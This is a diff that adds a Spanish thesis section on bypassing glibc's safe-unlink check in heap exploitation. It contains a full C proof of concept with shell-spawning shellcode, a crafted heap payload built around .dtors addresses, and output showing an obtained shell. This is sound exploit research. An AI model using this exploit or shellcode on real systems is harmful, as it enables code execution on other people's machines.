@@ -1,0 +1,157 @@
+\subsection{Sobre Unlink}
+\label{sec:about_unlink}
+
+Las preguntas expuestas en el apartado anterior nos llevan a lo que bien podría ser el renacer de la técnica \textit{unlink}. Si es cierto que las técnicas del Malloc Maleficarum pueden aplicarse en \textit{software} real, lo expuesto en este apartado sin duda tendría que significar el resurgir de la técnica \textit{unlink}. Evidentemente, esta hipótesis se fundamenta en un razonamiento sin sentido, pero dicho razonamiento se me plantea de manera obvia después de haber estudiado todas estas técnicas. Posiblemente esté obviando algún dato o esté incurriendo en algún error en mi planteamiento porque de ser correcto significaría que técnicas como The House of Mind no son más que un ejercicio intelectual que en nada facilitan, en comparación a las técnicas existentes, la explotación del \textit{heap}. Veamos a lo que me refiero. \bigskip
+
+Por un lado tenemos que en The House of Mind, se necesita la dirección del primer fragmento de memoria, |p|. Esto es necesario para llevar a cabo la técnica y conseguir ejecutar código arbitrario. Sin embargo, a parte de necesitar la dirección de |p|, Phantasmal Phantasmagoria descubrió un nuevo vector de ataque que, por desgracia, tenía muchos otros requisitos como por ejemplo poder ubicar un fragmento de memoria en direcciones de memoria del estilo 0x081xxxxx. La técnica de The House of Mind, al igual que todas las otras técnicas del Malloc Maleficarum, eran muchísimo más complejas que la técnica existente hasta el momento, con lo que, evidentemente, llevarla a cabo en un escenario real era mucho más difícil. Pero ¿qué podríamos conseguir sabiendo la dirección de un fragmento de memoria |p| mediante la técnica \textit{unlink}? \bigskip
+
+Por un lado tenemos que \textit{unlink} dejó de ser funcional cuando la macro se modificó de tal modo que quedó tal y como se muestra en el Código \ref{code:unlink_check_conclusion}.\bigskip
+
+\lstset{language=C, caption=Comprobación en la macro unlink (malloc.c:1986) , label=code:unlink_check_conclusion}
+\begin{lstlisting}
+/* Take a chunk off a bin list */
+#define unlink(P, BK, FD) {                                           \
+  FD = P->fd;                                                         \
+  BK = P->bk;                                                         \
+  if (__builtin_expect (FD->bk != P || BK->fd != P, 0))               \
+   malloc_printerr (check_action, "corrupted double-linked list", P); \
+  else {                                                              \
+    FD->bk = BK;                                                      \
+    BK->fd = FD;                                                      \
+  }                                                                   \
+}
+\end{lstlisting}
+
+Si se conociera la dirección de |P| antes de ejecutar el exploit, tal y como es requisito en The House of Mind, ¿se podría evadir la medida de seguridad implementada en \textit{unlink}? \bigskip
+
+Tal y como se ha detallado en otros capítulos, para explotar la vulnerabilidad en \textit{unlink}, el campo |fd| del fragmento a desenlazar debe apuntar a la dirección donde se encuentra la sección .dtors + 4 - 12 bytes. Para refrescar la memoria, los 4 bytes de más eran para sobrescribir el destructor declarado en la prueba de concepto y la resta de 12 bytes se debía al \textit{offset} de 12 bytes que se introducía con la instrucción |FD->bk = BK| de la macro \textit{unlink}. \bigskip
+
+Así pues, si antes de realizar el primer |free()| que ejecutaría la macro \textit{unlink} se sobrescribiera la dirección de memoria dónde empieza la sección .dtors + 4 bytes con la dirección del fragmento |P|, la condición |FD->bk != P| de la nueva macro \textit{unlink} dejaría de cumplirse ya que |FD->bk| apuntaría a |P|. Llevar a cabo esta acción no sería un problema ya que es posible escribir en dicha dirección de memoria si se le asignan los permisos adecuados. \bigskip
+
+Por otro lado, el campo |bk| del fragmento |P| apunta al \textit{shellcode} que se va a utilizar. Si en un \textit{offset} de 8 bytes desde el inicio del \textit{shellcode} se escribiera la dirección del fragmento |P| la condición |BK->fd != P| también dejaría de cumplirse. Este paso no tiene ningún problema ya que el contenido del \textit{shellcode} se puede controlar y los primeros 12 bytes del \textit{shellcode} son basura con lo que se pueden sobrescribir sin ningún problema. \bigskip
+
+Veamos si es cierto. En el Código \ref{code:unlink_hack} se muestra el código fuente de la prueba de concepto que demuestra lo dicho hasta el momento.\bigskip
+
+\lstset{language=C, caption=Evasión de las medidas de seguridad en la macro unlink , label=code:unlink_hack}
+\begin{lstlisting}
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <unistd.h>
+
+
+#define PAYLOAD_SIZE	531
+
+void world_destruction() __attribute__((destructor));
+void build_payload (char *, void *);
+
+char shellcode[]= 	/* jmp 12 + 12 nops */
+			"\xeb\x0a\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+			/* shellcode by vlan7 and sch3m4 */
+			"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9"
+			"\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
+			"\x69\x8d\x41\x0b\x89\xe3\xcd\x80";
+
+int main(int argc, char ** argv) {
+	
+
+	char crafted_data[700] = {0};
+	
+	char * ptr_1 = (char *) malloc (512);
+	char * ptr_2 = (char *) malloc (512);
+	
+	/* Obtain the page size of the system */
+	int pagesize = sysconf(_SC_PAGE_SIZE);
+	if ( pagesize == -1) {
+		perror("[-] Page size could not be obtained");
+		exit(EXIT_FAILURE);
+	}
+	/* Obtain an aligned memory region in order to mprotect it */
+	void * real_shell;
+	if ( posix_memalign(&real_shell, pagesize, sizeof(shellcode)) ) {
+		perror("[+] Aligned memory could not be obtained");
+		exit(EXIT_FAILURE);
+	}
+	/* Copy the shellcode to the executable region obtained with memalign */
+	memcpy(real_shell, shellcode, sizeof(shellcode));
+	/* Making  shellcode location executable */
+	mprotect(real_shell, pagesize, PROT_WRITE | PROT_EXEC);
+	/* Making DTORS section writable */
+	mprotect((void*)0x8049000, pagesize, PROT_WRITE);
+	/* The payload is built */
+	build_payload(crafted_data, real_shell);
+
+
+	unsigned long * dtors_ptr = (unsigned long *)0x08049f1c;
+	*dtors_ptr = (unsigned long )( ptr_2 - 0x8);
+	memcpy(real_shell + 8, dtors_ptr, 4);
+
+	memcpy(ptr_1, crafted_data, PAYLOAD_SIZE);
+
+	free(ptr_1);
+	printf("First free executed.\n");
+//	free(ptr_2);	
+	printf("Second free commented.\n");
+	
+	return 0;
+}
+
+void build_payload(char * crafted_data, void * sc_addr) {
+
+	char str_dtor_ptr[5] = {0};
+	char * seek = crafted_data;
+	
+	/* Trash */
+	memset(seek, '@', 516); 
+	seek += 516;
+	/* size of second freed chunk. Hexadecimal 16 value */
+	/* PREV_INUSE bit set. Avoid consolidate backward (unlink) on 2nd free */
+	memcpy(seek, "\x11\x00\x00\x00", 4);
+	seek += 4;
+	/* fd of second freed chunk. dtors_end - 12 */
+	memcpy(str_dtor_ptr, "\x10\x9f\x04\x08", 4);
+	memcpy(seek, str_dtor_ptr, 4);
+	seek += 4;
+	/* bk of second freed chunk. Shellcode address */	
+	memcpy(seek, &sc_addr, 4);
+	seek += 4;
+	/* Trash */
+	memset(seek, '@', 12); 
+	seek += 12;
+	/* size of fake chunk. PREV_INUSE bit unset. -8 value */
+	/* triggers unlink in the nextinuse of the first free() */
+	memcpy(seek, "\xf8\xff\xff\xff", 4);
+	seek += 4;
+	/* Trash */
+	memset(seek, '@', 12); 
+	seek += 12;	
+	/* Size of the second fake chunk */
+	/* if the PREV_INUSE bit is set, the unlink is not triggered */
+	/* in the second free()*/
+	memcpy(seek, "\x41@@@", 4);
+	seek += 4;
+}
+
+void world_destruction() {}
+\end{lstlisting}
+
+Como se puede ver, se utiliza la misma metodología que cuando en apartados anteriores se explotaba el \textit{heap} vía la macro \textit{unlink}. Lo cierto es que este código es el que se comentaba en el apartado \ref{sec:glibc_exploiting} cuando se hablaba de utilizar un offset positivo. \\
+Las líneas 50, 51 y 52 son las que escriben la dirección de |P| en la sección .dtors y en el \textit{shellcode}. Debido a que el fragmento que se desenlaza es el siguiente a |ptr_1|\footnote{Recordar que en la técnica de unlink, el primer free() es el que ejecuta la sobrescritura en la sección .dtors.}, |P| es el fragmento de memoria donde se almacenan los datos de |ptr_2|. \\
+Al ejecutarse la prueba de concepto se obtiene lo siguiente: \bigskip
+
+\begin{listing}[style=consola, caption=Ejecución de la prueba de concepto, label=out:unlink_hack]
+newlog@ubuntu:~/Documents/TFM/Heap/heap_exploiting/codes/unlink/ptmalloc2_test$ gcc the_great_unlink.c -o the_great_unlink
+newlog@ubuntu:~/Documents/TFM/Heap/heap_exploiting/codes/unlink/ptmalloc2_test$ ./the_great_unlink 
+First free executed.
+Second free commented.
+$ id
+uid=1000(newlog) gid=1000(newlog) groups=1000(newlog),4(adm),20(dialout),24(cdrom),46(plugdev),111(lpadmin),119(admin),122(sambashare)
+$ exit
+\end{listing}
+
+Como se puede ver, se ha ejecutado el \textit{shellcode}. Destacar que el segundo |free()| en el código de la prueba de concepto está comentado ya que lanzaba el error |invalid next size (fast)|. Se debería ajustar el \textit{payload} de modo que esto no ocurriera, sin embargo, el objetivo de este apartado ya está cumplido. Con la ejecución de sólo un |free()| y mediante la técnica \textit{unlink} se ha podido ejecutar código arbitrario en la \textit{glibc} 2.12.1. A parte de posibles detalles en el payload y si no se han añadido nuevas medidas de seguridad en la macro \textit{unlink}, está técnica debería funcionar sin ningún problema en las versiones más recientes de la \textit{glibc}. \bigskip
+
+\vspace*{2em}
+
+Todo esto me lleva a preguntarme el porqué de técnicas como The House of Mind. Evidentemente, según mi opinión, The House of Mind es una técnica sublime, genial. Después de mucho tiempo utilizando las mismas técnicas para explotar el \textit{heap} apareció el Malloc Maleficarum como si fuera una bocanada de aire fresco. Enfocó desde otro prisma las vulnerabilidades en la gestión de la memoria dinámica. Abriendo nuevos caminos hacia la explotación del \textit{heap}. Fue algo positivo para la comunidad. Tanto para los \textit{hackers} como para los desarrolladores de la \textit{glibc} porqué les permitió implementar la gestión de la memoria dinámica en Linux de un modo más robusto. Es por esto que jamás ha sido mi intención infravalorar el potencial de dichas técnicas, simplemente me ha sorprendido que nadie más haya visto o publicado la idea que aquí se ha planteado.
